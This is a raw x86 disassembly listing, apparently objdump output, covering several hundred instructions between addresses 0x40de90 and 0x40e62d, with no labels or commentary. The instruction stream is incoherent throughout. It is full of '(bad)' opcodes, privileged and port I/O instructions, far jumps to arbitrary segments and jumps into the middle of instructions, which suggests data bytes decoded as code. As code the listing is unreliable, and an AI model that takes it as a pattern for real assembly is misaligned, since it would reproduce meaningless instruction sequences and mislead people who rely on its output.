  40de90:	ja     0x40de98
  40de92:	or     cl,BYTE PTR [ebp+0x6d069c65]
  40de98:	sti    
  40de99:	scas   eax,DWORD PTR es:[edi]
  40de9a:	gs cdq 
  40de9c:	stos   DWORD PTR es:[edi],eax
  40de9d:	ret    
  40de9e:	(bad)  
  40de9f:	jge    0x40deb5
  40dea1:	les    edx,FWORD PTR [ebx]
  40dea3:	mov    edi,ebp
  40dea5:	add    DWORD PTR [edx+0x51],0x11203ec1
  40deac:	aad    0x9d
  40deae:	mov    eax,ds:0x82785d71
  40deb3:	xor    BYTE PTR [ecx+edi*1+0x24],al
  40deb7:	out    dx,al
  40deb8:	retf   
  40deb9:	fs push edx
  40debb:	bound  esp,QWORD PTR [esi]
  40debd:	mul    DWORD PTR [ebx+0x7f17ac67]
  40dec3:	aam    0x42
  40dec5:	push   esi
  40dec6:	adc    edx,DWORD PTR [ecx-0x7a]
  40dec9:	int    0xf6
  40decb:	inc    esi
  40decc:	out    0xd9,eax
  40dece:	xchg   DWORD PTR [ebx],esi
  40ded0:	lods   eax,DWORD PTR ds:[esi]
  40ded1:	pop    es
  40ded2:	ins    DWORD PTR es:[edi],dx
  40ded3:	cmp    DWORD PTR [edx+0x16d8462],edx
  40ded9:	scas   eax,DWORD PTR es:[edi]
  40deda:	sbb    esp,ecx
  40dedc:	sub    esp,ecx
  40dede:	jge    0x40decb
  40dee0:	loop   0x40de82
  40dee2:	fstp   QWORD PTR [edi]
  40dee4:	mov    al,ds:0x9bc03421
  40dee9:	ds mov eax,0x25ec5c72
  40deef:	ret    
  40def0:	mov    ds:0x6834a58,eax
  40def5:	push   eax
  40def6:	xchg   ebx,eax
  40def7:	mov    edi,0x81e6c046
  40defc:	jge    0x40ded4
  40defe:	arpl   WORD PTR [esi-0x1c],si
  40df01:	and    al,0xed
  40df03:	ja     0x40df67
  40df05:	iret   
  40df06:	std    
  40df07:	shr    esi,0x2a
  40df0a:	push   edx
  40df0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df0c:	cmp    eax,DWORD PTR [edx+eax*1-0x2d]
  40df10:	dec    dx
  40df12:	mov    ch,0x68
  40df14:	js     0x40df4a
  40df16:	in     eax,dx
  40df17:	mov    ebp,0x121f86b0
  40df1c:	sbb    eax,ebx
  40df1e:	jg     0x40dee3
  40df20:	add    DWORD PTR [esi],0x6c
  40df23:	or     cl,BYTE PTR [edi]
  40df25:	sti    
  40df26:	xchg   BYTE PTR [ecx-0x54f79a9b],cl
  40df2c:	sub    eax,0xab0c4cb1
  40df31:	popf   
  40df32:	dec    eax
  40df33:	sbb    eax,0xa7763a7f
  40df38:	xchg   ebx,eax
  40df39:	jmp    0x40dfa1
  40df3b:	and    eax,0xbe1f1e20
  40df40:	sub    ch,al
  40df42:	dec    esp
  40df43:	sahf   
  40df44:	push   eax
  40df45:	rcr    DWORD PTR [eax-0xc0a2331],1
  40df4b:	mov    dl,0x31
  40df4d:	mov    BYTE PTR [ebx+0x20],al
  40df50:	es jl  0x40df93
  40df53:	and    eax,0x27bf9ea8
  40df58:	test   DWORD PTR [edi],esp
  40df5a:	ret    0xfb1c
  40df5d:	mov    ch,0x7e
  40df5f:	jno    0x40defe
  40df61:	xor    cl,0x7f
  40df64:	aad    0x5d
  40df66:	xor    al,0xa2
  40df68:	add    bl,BYTE PTR [ecx+0x4a]
  40df6b:	rcr    BYTE PTR [ebx+esi*1],0x24
  40df6f:	jne    0x40df6a
  40df71:	in     eax,dx
  40df72:	push   cs
  40df73:	xor    edi,DWORD PTR [edi]
  40df75:	push   0x6c32743d
  40df7a:	dec    esi
  40df7b:	mov    ds:0xa4385440,eax
  40df80:	pop    esi
  40df81:	dec    eax
  40df82:	sar    al,1
  40df84:	in     al,dx
  40df85:	fisubr DWORD PTR [ecx]
  40df87:	loopne 0x40df90
  40df89:	inc    ecx
  40df8a:	popa   
  40df8b:	ss aad 0xe8
  40df8e:	mov    ah,0x71
  40df90:	repnz lods al,BYTE PTR ds:[esi]
  40df92:	jo     0x40dfc4
  40df94:	leave  
  40df95:	test   DWORD PTR [edx-0x5d],edx
  40df98:	int3   
  40df99:	push   es
  40df9a:	cmp    cl,BYTE PTR [ecx+ecx*8+0x516ab63]
  40dfa1:	js     0x40df4f
  40dfa3:	icebp  
  40dfa4:	test   BYTE PTR [ebx],bh
  40dfa6:	pop    esi
  40dfa7:	neg    DWORD PTR [ebx-0x3f]
  40dfaa:	stos   DWORD PTR es:[edi],eax
  40dfab:	loop   0x40dfa0
  40dfad:	adc    ch,BYTE PTR [ebp+ebp*2+0x620fedca]
  40dfb4:	sbb    ah,BYTE PTR [ebx+ebx*1+0x295821fa]
  40dfbb:	xor    eax,0xed55dab3
  40dfc0:	mov    al,cs:0x8e21c408
  40dfc6:	mov    bl,0x25
  40dfc8:	jecxz  0x40dfa0
  40dfca:	pop    es
  40dfcb:	lock sahf 
  40dfcd:	and    eax,0x2ccaab54
  40dfd2:	mov    edi,0x90a6e24a
  40dfd7:	retf   0xccf
  40dfda:	sbb    eax,DWORD PTR [eax+0x5f7c3a5]
  40dfe0:	sub    edi,edx
  40dfe2:	sti    
  40dfe3:	jp     0x40e02a
  40dfe5:	adc    eax,0x25938d29
  40dfea:	add    dl,cl
  40dfec:	add    ecx,DWORD PTR [edx]
  40dfee:	test   al,0xc8
  40dff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dff1:	in     al,0x70
  40dff3:	add    edi,0x55b44f16
  40dff9:	in     eax,0xfc
  40dffb:	je     0x40e001
  40dffd:	and    al,0xca
  40dfff:	cmp    DWORD PTR [edx-0x51fbc4f6],esp
  40e005:	add    BYTE PTR [ebx],al
  40e007:	jb     0x40e07f
  40e009:	inc    eax
  40e00a:	mov    ebx,0x2c14072a
  40e00f:	dec    ebx
  40e010:	int    0x15
  40e012:	retf   0x4c0f
  40e015:	test   al,ah
  40e017:	sbb    DWORD PTR [ebp-0x22214a9f],ecx
  40e01d:	jmp    0x922e405d
  40e022:	cmp    DWORD PTR [ebp-0x68],esp
  40e025:	and    edx,esp
  40e027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e028:	das    
  40e029:	rcl    DWORD PTR [esi],1
  40e02b:	fisttp DWORD PTR [ebx+0x67735d60]
  40e031:	mov    cl,0x1f
  40e033:	ror    ecx,cl
  40e035:	pop    esp
  40e036:	dec    ebx
  40e037:	sbb    al,0x91
  40e039:	dec    ebp
  40e03a:	rcl    BYTE PTR [ecx+0x3],0xfb
  40e03e:	mov    cl,0x43
  40e040:	fsub   QWORD PTR [edx+0x57]
  40e043:	jg     0x40e042
  40e045:	mov    dh,0xe1
  40e047:	push   ebp
  40e048:	(bad)  
  40e04a:	pop    ds
  40e04b:	fld    QWORD PTR [eax]
  40e04d:	fst    QWORD PTR [ecx-0xc]
  40e050:	mov    cl,0x79
  40e052:	mov    dl,0x2b
  40e054:	(bad)  
  40e055:	fsub   QWORD PTR [ebp+edx*2-0x64]
  40e059:	std    
  40e05a:	inc    ebp
  40e05b:	jnp    0x40e0c2
  40e05d:	push   ss
  40e05e:	(bad)  
  40e05f:	jb     0x40e02b
  40e061:	push   edi
  40e062:	fsubrp st(1),st
  40e064:	push   es
  40e065:	bound  esp,QWORD PTR [edi+0x4]
  40e068:	xchg   DWORD PTR [esi],edx
  40e06a:	ins    BYTE PTR es:[edi],dx
  40e06b:	mov    ds:0xc0433591,eax
  40e070:	pop    ebp
  40e071:	jmp    0xa97b20a6
  40e076:	inc    edx
  40e077:	in     eax,dx
  40e078:	stc    
  40e079:	(bad)  [ecx]
  40e07b:	(bad)  
  40e07c:	xor    DWORD PTR [edi+0x5d],eax
  40e07f:	adc    al,0xd6
  40e081:	xlat   BYTE PTR ds:[ebx]
  40e082:	and    ah,BYTE PTR [ebx+0x29cfc784]
  40e088:	sub    al,al
  40e08a:	push   ebx
  40e08b:	mov    ah,0x6e
  40e08d:	fld    DWORD PTR [ecx-0x52]
  40e090:	lock mov ebx,0x68586e07
  40e096:	or     al,0xa6
  40e098:	add    al,0xf5
  40e09a:	jp     0x40e0b0
  40e09c:	mov    ebx,0x9e43f9d7
  40e0a1:	fisub  DWORD PTR [ecx+ebx*2]
  40e0a4:	pop    ss
  40e0a5:	cmp    eax,0x9d836ded
  40e0aa:	lea    ebx,[edx-0x21cf7b10]
  40e0b0:	pop    eax
  40e0b1:	mov    WORD PTR [edi-0x30],cs
  40e0b4:	mov    edi,0x72fd896b
  40e0b9:	xor    esp,DWORD PTR [edx+0x6b]
  40e0bc:	mov    dh,0x12
  40e0be:	repnz push 0xe8fbcd4f
  40e0c4:	adc    al,BYTE PTR [edx]
  40e0c6:	jo     0x40e144
  40e0c8:	shr    BYTE PTR [edx-0x7ee637a1],1
  40e0ce:	mov    esi,0xa700f38e
  40e0d3:	mov    edi,0xddb20b09
  40e0d8:	adc    al,0xfd
  40e0da:	dec    edi
  40e0db:	mov    bh,0xdf
  40e0dd:	test   al,0x74
  40e0df:	xor    eax,0x54005e7
  40e0e4:	popa   
  40e0e5:	mov    dh,BYTE PTR [ebx+0x68cfc128]
  40e0eb:	push   ss
  40e0ec:	mov    dh,0xfa
  40e0ee:	dec    edx
  40e0ef:	push   edx
  40e0f0:	dec    ecx
  40e0f1:	call   0xe8c86d90
  40e0f6:	xchg   ebx,eax
  40e0f7:	and    eax,0x29dced19
  40e0fc:	adc    eax,0xe4d5ca7e
  40e101:	or     al,0xb6
  40e103:	pop    ebp
  40e104:	call   0x16c733ed
  40e109:	add    ebp,DWORD PTR [ecx+0x7923139c]
  40e10f:	out    dx,al
  40e110:	imul   esi,edi,0x3d620d76
  40e116:	or     ecx,DWORD PTR [ebx+0x4996c16b]
  40e11c:	sbb    eax,0x87cf142d
  40e121:	sbb    ebp,eax
  40e123:	iret   
  40e124:	out    dx,al
  40e125:	ins    DWORD PTR es:[edi],dx
  40e126:	ss scas al,BYTE PTR es:[edi]
  40e128:	mov    ah,0xe2
  40e12a:	retf   0xd884
  40e12d:	dec    ecx
  40e12e:	int3   
  40e12f:	add    eax,0xc260b021
  40e134:	int3   
  40e135:	push   ecx
  40e136:	cmp    bl,dh
  40e138:	dec    ebp
  40e139:	sbb    eax,0x9ccf78c1
  40e13e:	repz out 0xba,al
  40e141:	xchg   ebx,eax
  40e142:	xor    al,0x5e
  40e144:	ja     0x40e174
  40e146:	and    eax,0xf6b8d809
  40e14b:	mov    cl,BYTE PTR [eax]
  40e14d:	sub    esp,DWORD PTR [eax]
  40e14f:	push   0x33931af7
  40e154:	stos   BYTE PTR es:[edi],al
  40e155:	xor    ebp,ecx
  40e157:	imul   ebp,DWORD PTR [esi-0x59],0x474889d3
  40e15e:	mov    al,0x76
  40e160:	xchg   ebp,eax
  40e161:	mov    cl,0x26
  40e163:	xchg   BYTE PTR es:[edi],dh
  40e166:	loopne 0x40e11a
  40e168:	xor    ah,BYTE PTR [ecx+0x6a]
  40e16b:	scas   eax,DWORD PTR es:[edi]
  40e16c:	push   eax
  40e16d:	xlat   BYTE PTR ds:[ebx]
  40e16e:	outs   dx,BYTE PTR ds:[esi]
  40e16f:	push   ecx
  40e170:	inc    esp
  40e171:	mov    al,ds:0xc5a25202
  40e176:	push   0xffffffb7
  40e178:	jns    0x40e13f
  40e17a:	sub    dh,BYTE PTR [ebp-0x44]
  40e17d:	or     eax,0xf44b6975
  40e182:	dec    esp
  40e183:	cmp    DWORD PTR [ebx+0x23],ebx
  40e186:	popa   
  40e187:	sub    DWORD PTR [esi+0x49],ebp
  40e18a:	lods   eax,DWORD PTR ds:[esi]
  40e18b:	push   esp
  40e18c:	lds    edx,FWORD PTR [ebp-0x6a]
  40e18f:	add    ah,BYTE PTR [edx+0x15]
  40e192:	or     ebx,ebx
  40e194:	lds    ebp,FWORD PTR [ebx-0x2698daf8]
  40e19a:	mov    edi,0x8346d6cb
  40e19f:	sbb    ebx,edi
  40e1a1:	outs   dx,BYTE PTR ds:[esi]
  40e1a2:	dec    DWORD PTR [eax+0x1f698d7e]
  40e1a8:	sbb    eax,0x5e79b50a
  40e1ad:	fld    TBYTE PTR [edi+ebp*4-0x2a]
  40e1b1:	loop   0x40e17f
  40e1b3:	jb     0x40e1b1
  40e1b5:	jge    0x40e160
  40e1b7:	and    bl,BYTE PTR [eax+0x58]
  40e1ba:	leave  
  40e1bb:	xlat   BYTE PTR ds:[ebx]
  40e1bc:	repz popf 
  40e1be:	add    eax,0x6f5bb807
  40e1c3:	stos   DWORD PTR es:[edi],eax
  40e1c4:	sbb    bh,BYTE PTR [eax]
  40e1c6:	test   eax,0xa0a3e9db
  40e1cb:	nop
  40e1cc:	repnz lahf 
  40e1ce:	add    al,0x79
  40e1d0:	ret    0xb9fc
  40e1d3:	(bad)  
  40e1d4:	les    ebx,FWORD PTR [edx]
  40e1d6:	fdiv   DWORD PTR [ebp+edx*1+0x24]
  40e1da:	mov    eax,0x99ad13e4
  40e1df:	test   eax,0x663abaad
  40e1e4:	push   esi
  40e1e5:	std    
  40e1e6:	jnp    0x40e20d
  40e1e8:	pop    edx
  40e1e9:	pop    ebx
  40e1ea:	inc    esi
  40e1eb:	aas    
  40e1ec:	clc    
  40e1ed:	inc    edi
  40e1ee:	aas    
  40e1ef:	sub    BYTE PTR ds:0x12027c15,ah
  40e1f5:	pop    es
  40e1f6:	js     0x40e250
  40e1f8:	xchg   ebp,eax
  40e1f9:	xchg   esp,eax
  40e1fa:	fidivr WORD PTR [edi]
  40e1fc:	sub    eax,0x4f2aa8f2
  40e201:	sub    al,0xe7
  40e203:	outs   dx,DWORD PTR ds:[esi]
  40e204:	or     eax,0x2d641384
  40e209:	xchg   DWORD PTR [edx+0x4a1ef14d],edx
  40e20f:	xlat   BYTE PTR gs:[ebx]
  40e211:	cdq    
  40e212:	out    0x3f,eax
  40e214:	sbb    eax,0xda884861
  40e219:	icebp  
  40e21a:	imul   ecx,DWORD PTR ds:0xd7fff533,0xfffffffb
  40e221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e222:	arpl   WORD PTR [edi-0x2b],dx
  40e225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e226:	xor    eax,0x59c4ae10
  40e22b:	xchg   edi,eax
  40e22c:	test   eax,0xba79695c
  40e231:	loope  0x40e205
  40e233:	mov    dh,0x6b
  40e235:	out    dx,eax
  40e236:	dec    ebx
  40e237:	jecxz  0x40e1cb
  40e239:	rol    DWORD PTR [ecx-0xdd6ec04],1
  40e23f:	push   ds
  40e240:	xchg   ebp,eax
  40e241:	sbb    bh,bh
  40e243:	pop    ecx
  40e244:	or     dh,ah
  40e246:	in     al,0xb5
  40e248:	inc    esp
  40e249:	icebp  
  40e24a:	adc    ecx,DWORD PTR [ebx-0x6b4cc231]
  40e250:	pop    ebp
  40e251:	and    ch,BYTE PTR [ebp-0x533596f3]
  40e257:	ret    0x229
  40e25a:	cld    
  40e25b:	mov    ah,0xca
  40e25d:	pop    es
  40e25e:	push   ebp
  40e25f:	inc    esp
  40e260:	mov    ch,0xfd
  40e262:	out    dx,eax
  40e263:	and    al,0xe2
  40e265:	pop    esi
  40e266:	jbe    0x40e204
  40e268:	pushf  
  40e269:	sahf   
  40e26a:	cmp    al,0x92
  40e26c:	jmp    0xb9e9:0x792455e4
  40e273:	dec    eax
  40e274:	cmp    bh,BYTE PTR [ebx-0x38]
  40e277:	pop    es
  40e278:	in     al,dx
  40e279:	xor    eax,0xe2067f4f
  40e27e:	cwde   
  40e27f:	mov    DWORD PTR [ebp+0x59],eax
  40e282:	stos   DWORD PTR es:[edi],eax
  40e283:	mov    esi,0x594dd7a8
  40e288:	lods   al,BYTE PTR ds:[esi]
  40e289:	xchg   DWORD PTR [edi+ebp*2+0x3b],ebx
  40e28d:	sbb    DWORD PTR [esi-0x6f],ebx
  40e290:	loop   0x40e2d4
  40e292:	mov    bl,0x97
  40e294:	fstp   DWORD PTR [esi-0x477b77ae]
  40e29a:	lods   eax,DWORD PTR ds:[esi]
  40e29b:	pop    esp
  40e29c:	dec    esi
  40e29d:	lods   eax,DWORD PTR ds:[esi]
  40e29e:	cmp    eax,0x340e88a1
  40e2a3:	in     al,dx
  40e2a4:	push   es
  40e2a5:	xchg   ebp,ebp
  40e2a7:	dec    ebp
  40e2a8:	adc    al,0x96
  40e2aa:	mov    eax,ds:0x2701c992
  40e2af:	push   0xffffff80
  40e2b1:	div    DWORD PTR [edx]
  40e2b3:	adc    DWORD PTR [esi-0x6f],esi
  40e2b6:	ds sar edx,cl
  40e2b9:	dec    ecx
  40e2ba:	(bad)  
  40e2bc:	addr16 push eax
  40e2be:	retf   0x4e
  40e2c1:	xor    esi,DWORD PTR [edx+0x648b1be3]
  40e2c7:	pop    ebx
  40e2c8:	das    
  40e2c9:	jae    0x40e2ca
  40e2cb:	cmp    bl,BYTE PTR [ecx+0x3113b763]
  40e2d1:	fadd   DWORD PTR [eax-0x25595967]
  40e2d7:	and    ah,BYTE PTR [ebx+ecx*2+0x357f0bc5]
  40e2de:	rcl    DWORD PTR [ebp-0x703006c6],1
  40e2e4:	sbb    ebp,DWORD PTR [ebx+0x5fa9b6ce]
  40e2ea:	or     ecx,DWORD PTR [ecx]
  40e2ec:	aaa    
  40e2ed:	hlt    
  40e2ee:	push   esp
  40e2ef:	sbb    BYTE PTR [ecx+edi*2-0x48],dl
  40e2f3:	cld    
  40e2f4:	mov    ah,0xec
  40e2f6:	sub    BYTE PTR [ebp+0x57],bl
  40e2f9:	inc    esp
  40e2fa:	jmp    0x8d47d25f
  40e2ff:	inc    edi
  40e300:	aas    
  40e301:	in     eax,0x86
  40e303:	ds xor eax,0x129bb6b9
  40e309:	ror    BYTE PTR [ebx],1
  40e30b:	std    
  40e30c:	fstp   TBYTE PTR [edi+0x71fd67d5]
  40e312:	ror    DWORD PTR [eax],1
  40e314:	mov    ah,0x3c
  40e316:	aaa    
  40e317:	mov    ds:0x6aff2ad2,al
  40e31c:	sti    
  40e31d:	retf   
  40e31e:	(bad)
  40e321:	push   eax
  40e322:	jno    0x40e39e
  40e324:	jmp    0x40e300
  40e326:	loopne 0x40e311
  40e328:	fsubr  DWORD PTR [ebx-0x70316917]
  40e32e:	lods   eax,DWORD PTR ds:[esi]
  40e32f:	or     esi,esp
  40e331:	push   edi
  40e332:	add    edi,DWORD PTR [eax]
  40e334:	(bad)  
  40e336:	push   edx
  40e337:	sti    
  40e338:	add    ah,dh
  40e33a:	out    0x99,al
  40e33c:	push   ecx
  40e33d:	dec    esp
  40e33e:	out    0x78,al
  40e340:	(bad)  
  40e341:	ss sub al,0x16
  40e344:	pop    ds
  40e345:	push   esp
  40e346:	shr    BYTE PTR [esi-0x66],1
  40e349:	adc    al,0xa3
  40e34b:	ja     0x40e2d0
  40e34d:	jle    0x40e34e
  40e34f:	cmp    ebp,ecx
  40e351:	les    ebp,FWORD PTR ds:0xbaa275e0
  40e357:	into   
  40e358:	add    ebx,0xe9d8fe29
  40e35e:	pop    ds
  40e35f:	(bad)  
  40e360:	ficomp DWORD PTR [edx]
  40e362:	xlat   BYTE PTR ds:[ebx]
  40e363:	mov    dh,0x4d
  40e365:	mov    al,ds:0x34ec6368
  40e36a:	iret   
  40e36b:	call   0x56cc:0xfbab4500
  40e372:	dec    edx
  40e373:	xchg   esi,eax
  40e374:	and    cl,bl
  40e376:	(bad)  
  40e377:	call   0xa8bbc9e2
  40e37c:	push   ds
  40e37d:	add    eax,0x3f7a9f3e
  40e382:	jl     0x40e392
  40e384:	jb     0x40e3a5
  40e386:	push   eax
  40e387:	jnp    0x40e30b
  40e389:	daa    
  40e38a:	adc    bl,BYTE PTR [ebp+0x6c9677bd]
  40e390:	adc    al,0xf0
  40e392:	lock sub DWORD PTR [ebx+0xf5f797a],esi
  40e399:	dec    esi
  40e39a:	push   ds
  40e39b:	or     ebx,edx
  40e39d:	xchg   edi,ebx
  40e39f:	(bad)  
  40e3a0:	ret    0x681f
  40e3a3:	retf   
  40e3a4:	and    dl,ah
  40e3a6:	leave  
  40e3a7:	push   es
  40e3a8:	xor    dh,cl
  40e3aa:	rol    DWORD PTR [edx],1
  40e3ac:	in     al,0x25
  40e3ae:	(bad)  
  40e3af:	scas   al,BYTE PTR es:[edi]
  40e3b0:	std    
  40e3b1:	stc    
  40e3b2:	mov    bh,0xca
  40e3b4:	jmp    0x40e428
  40e3b6:	and    BYTE PTR [ecx],dh
  40e3b8:	ret    
  40e3b9:	jb     0x40e3ee
  40e3bb:	fcomip st,st(4)
  40e3bd:	fsubrp st(3),st
  40e3bf:	mov    bh,0xdc
  40e3c1:	fstp   DWORD PTR [ebx+0x7b2b441f]
  40e3c7:	shl    BYTE PTR [esi+0x794948ea],1
  40e3cd:	push   eax
  40e3ce:	shl    ah,cl
  40e3d0:	mov    edi,0xc063c5a0
  40e3d5:	dec    ecx
  40e3d6:	fwait
  40e3d7:	and    al,0xed
  40e3d9:	hlt    
  40e3da:	inc    esp
  40e3db:	mov    ah,0xfe
  40e3dd:	into   
  40e3de:	repnz sahf 
  40e3e0:	lahf   
  40e3e1:	repz xchg bh,dl
  40e3e4:	imul   BYTE PTR [ecx+edi*4+0xba1af3c]
  40e3eb:	mov    bl,0x33
  40e3ed:	cmp    DWORD PTR [edi],eax
  40e3ef:	rol    BYTE PTR [esi+0x7df1a201],0x80
  40e3f6:	cs xchg ebx,eax
  40e3f8:	mov    eax,ds:0x49971c01
  40e3fd:	inc    ebx
  40e3fe:	sub    DWORD PTR [ecx+0x369eeb3f],edi
  40e404:	cwde   
  40e405:	sti    
  40e406:	std    
  40e407:	mov    edx,0x45e89bdf
  40e40c:	repz cdq 
  40e40e:	sub    ecx,0xffffffbb
  40e411:	jp     0x40e455
  40e413:	lahf   
  40e414:	arpl   cx,bx
  40e416:	lahf   
  40e417:	push   cs
  40e418:	(bad)  
  40e419:	hlt    
  40e41a:	outs   dx,DWORD PTR ds:[esi]
  40e41b:	mov    edx,esi
  40e41d:	mov    esp,0x8018e99a
  40e422:	xchg   esp,eax
  40e423:	frstor [eax+0xd]
  40e426:	bswap  eax
  40e428:	imul   BYTE PTR [ecx+0x65]
  40e42b:	cmp    DWORD PTR [ecx+edi*8],ebx
  40e42e:	adc    cl,bl
  40e430:	aam    0xd5
  40e432:	add    al,0x78
  40e434:	(bad)  [edi]
  40e436:	out    dx,eax
  40e437:	or     al,0x7d
  40e439:	sub    BYTE PTR [eax-0x73],ch
  40e43c:	cdq    
  40e43d:	ins    BYTE PTR es:[edi],dx
  40e43e:	fidivr WORD PTR [ecx-0x36f8c338]
  40e444:	pop    es
  40e445:	pushf  
  40e446:	mov    ch,0x6e
  40e448:	pop    ebx
  40e449:	cld    
  40e44a:	(bad)  
  40e44c:	mov    bh,0x6e
  40e44e:	add    ch,BYTE PTR [ecx+ebx*8-0x6c813db]
  40e455:	mov    al,0xaf
  40e457:	inc    edx
  40e458:	xchg   ebp,eax
  40e459:	pop    ecx
  40e45a:	inc    ebx
  40e45b:	stos   BYTE PTR es:[edi],al
  40e45c:	inc    esi
  40e45d:	inc    eax
  40e45e:	fld    QWORD PTR [ebx+ebx*2-0x65]
  40e462:	adc    al,0x91
  40e464:	ins    BYTE PTR es:[edi],dx
  40e465:	les    ebp,FWORD PTR [ecx]
  40e467:	loope  0x40e445
  40e469:	mov    esi,0x43bd5933
  40e46e:	fcom   DWORD PTR [ebp-0x317e3745]
  40e474:	ins    BYTE PTR es:[edi],dx
  40e475:	xor    bh,BYTE PTR [esi-0x51badba2]
  40e47b:	and    edx,DWORD PTR [edi+ecx*2+0x84f4de1]
  40e482:	adc    al,0x86
  40e484:	lahf   
  40e485:	ret    0xe104
  40e488:	inc    esi
  40e489:	gs (bad) 
  40e48b:	sub    esi,DWORD PTR [ecx+esi*8-0x6c]
  40e48f:	dec    BYTE PTR [ebp+eax*2+0xbd4c3ea]
  40e496:	ror    DWORD PTR [ebx],1
  40e498:	sub    ecx,0x6b283b7b
  40e49e:	dec    esp
  40e49f:	in     eax,dx
  40e4a0:	mov    ecx,0xa20dec18
  40e4a5:	repnz neg BYTE PTR [ebx+ebp*2-0x2e]
  40e4aa:	xor    al,0x93
  40e4ac:	call   0x2167:0x125aaa5a
  40e4b3:	sbb    eax,0xff4c2e5c
  40e4b8:	mov    ecx,0xcf09271c
  40e4bd:	add    DWORD PTR ds:0xba96536,ecx
  40e4c3:	(bad)  
  40e4c4:	fldcw  WORD PTR [edx]
  40e4c6:	inc    ebx
  40e4c7:	jne    0x40e51d
  40e4c9:	mov    dl,0x3f
  40e4cb:	jb     0x40e530
  40e4cd:	scas   al,BYTE PTR es:[edi]
  40e4ce:	stos   DWORD PTR es:[edi],eax
  40e4cf:	inc    ebp
  40e4d0:	and    eax,0x1003301e
  40e4d5:	sti    
  40e4d6:	fdivrp st(5),st
  40e4d8:	pop    edx
  40e4d9:	fcmovu st,st(5)
  40e4db:	call   0xb512:0x3406af51
  40e4e2:	dec    ebp
  40e4e3:	cmp    al,0x63
  40e4e5:	outs   dx,DWORD PTR ds:[esi]
  40e4e6:	jmp    0x6d93:0xdfcee950
  40e4ed:	adc    eax,0x2b3a9d7b
  40e4f2:	jmp    FWORD PTR [ebx]
  40e4f4:	es daa 
  40e4f6:	inc    edx
  40e4f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4f8:	push   es
  40e4f9:	dec    edx
  40e4fa:	dec    eax
  40e4fb:	or     DWORD PTR [edx-0x28ac916d],0x72ba4977
  40e505:	scas   al,BYTE PTR es:[edi]
  40e506:	repz jae 0x40e4ee
  40e509:	mov    eax,ds:0x8ee5547d
  40e50e:	or     BYTE PTR [edx+eax*2],al
  40e511:	int3   
  40e512:	pop    edi
  40e513:	fistp  DWORD PTR [esi+0x66c0aea]
  40e519:	shl    DWORD PTR [ebp+0xa00ebd0],cl
  40e51f:	(bad)  
  40e520:	fisub  DWORD PTR [ecx*2+0xf9ffa0e]
  40e527:	in     eax,dx
  40e528:	and    DWORD PTR [ecx+0x271cb194],0xffffffc4
  40e52f:	xchg   ebp,eax
  40e530:	in     eax,dx
  40e531:	out    0xa0,eax
  40e533:	sub    al,0xeb
  40e535:	mov    ds:0xcfefc4eb,al
  40e53a:	lods   al,BYTE PTR ds:[esi]
  40e53b:	popf   
  40e53c:	aaa    
  40e53d:	xor    bl,BYTE PTR [ecx+0xf448c42]
  40e543:	in     al,dx
  40e544:	sbb    al,BYTE PTR [esi+ecx*1-0x62]
  40e548:	mov    ebp,0x720f2104
  40e54d:	bound  esi,QWORD PTR [ecx-0x200f9123]
  40e553:	neg    BYTE PTR [edx+eax*8]
  40e556:	enter  0x957c,0x20
  40e55a:	pop    ds
  40e55b:	cs push 0x40
  40e55e:	retf   
  40e55f:	es pushw es
  40e562:	fisttp WORD PTR [edx-0x39f91f86]
  40e568:	js     0x40e58a
  40e56a:	das    
  40e56b:	jmp    0x40e5e0
  40e56d:	cmp    DWORD PTR [eax],edx
  40e56f:	dec    ebp
  40e570:	test   al,0x36
  40e572:	jmp    0xd18e46a3
  40e577:	hlt    
  40e578:	std    
  40e579:	dec    esi
  40e57a:	or     eax,0xdd2cf8cf
  40e57f:	jnp    0x40e56b
  40e581:	sbb    BYTE PTR [eax],bl
  40e583:	mov    esp,0x9c7eabf
  40e588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e589:	dec    edx
  40e58a:	nop
  40e58b:	icebp  
  40e58c:	pop    eax
  40e58d:	(bad)  
  40e58e:	loopne 0x40e5dc
  40e590:	sbb    esp,DWORD PTR [ecx-0x15c68b35]
  40e596:	ret    
  40e597:	call   0xf203:0xa27253e7
  40e59e:	or     DWORD PTR [eax],0x47225362
  40e5a4:	or     ah,bl
  40e5a6:	fwait
  40e5a7:	and    eax,0xec9b220e
  40e5ac:	pop    eax
  40e5ad:	inc    ecx
  40e5ae:	sbb    BYTE PTR [esi-0x4],dh
  40e5b1:	ins    DWORD PTR es:[edi],dx
  40e5b2:	call   0x58db:0x3fa0443b
  40e5b9:	out    0xae,al
  40e5bb:	mov    edi,0xb3368c67
  40e5c0:	fwait
  40e5c1:	and    al,0x2
  40e5c3:	mov    ds:0xb0d1b0f6,al
  40e5c8:	mov    ch,0x4a
  40e5ca:	mov    bh,0x45
  40e5cc:	shr    DWORD PTR [esi+0x7a],0x63
  40e5d0:	out    dx,al
  40e5d1:	in     eax,0xd8
  40e5d3:	inc    ecx
  40e5d4:	pop    ecx
  40e5d5:	hlt    
  40e5d6:	shl    BYTE PTR [edx+eax*4],1
  40e5d9:	xor    eax,0x8cd5a5e1
  40e5de:	retf   0x8904
  40e5e1:	scas   eax,DWORD PTR es:[edi]
  40e5e2:	or     eax,0x1b6dd6f8
  40e5e7:	sahf   
  40e5e8:	(bad)  
  40e5e9:	mov    edx,0x8d9da9fd
  40e5ee:	cmp    ecx,DWORD PTR [ebx-0x50a3e612]
  40e5f4:	inc    ebp
  40e5f5:	mov    edx,0x8cde9a11
  40e5fa:	add    edx,0xffffffc2
  40e5fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5fe:	call   0x8165840c
  40e603:	adc    al,0x4e
  40e605:	popa   
  40e606:	aas    
  40e607:	int    0x48
  40e609:	mov    edx,0x9e250cd8
  40e60e:	icebp  
  40e60f:	mov    dl,0xd
  40e611:	iret   
  40e612:	inc    eax
  40e613:	mov    ebp,0x12c82118
  40e618:	pop    esi
  40e619:	test   eax,0x9cd89a00
  40e61e:	sbb    ebp,DWORD PTR [ebx-0x45a6eeb0]
  40e624:	fst    DWORD PTR [edi+0x65]
  40e627:	or     ebp,DWORD PTR [edx]
  40e629:	cmp    al,0xa5
  40e62b:	mov    dl,0x2f
  40e62d:	cdq    
